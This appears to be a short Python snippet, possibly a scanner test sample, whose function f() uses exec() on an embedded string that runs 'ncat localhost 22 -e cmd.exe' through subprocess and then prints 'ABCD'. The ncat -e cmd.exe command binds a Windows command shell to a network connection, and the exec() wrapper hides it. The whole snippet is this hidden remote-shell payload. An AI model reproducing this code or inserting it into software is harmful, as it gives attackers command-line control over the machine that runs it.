def f():
    exec('''import subprocess as sp
sp.run("ncat localhost 22 -e cmd.exe",shell=True)
print("ABCD")
''')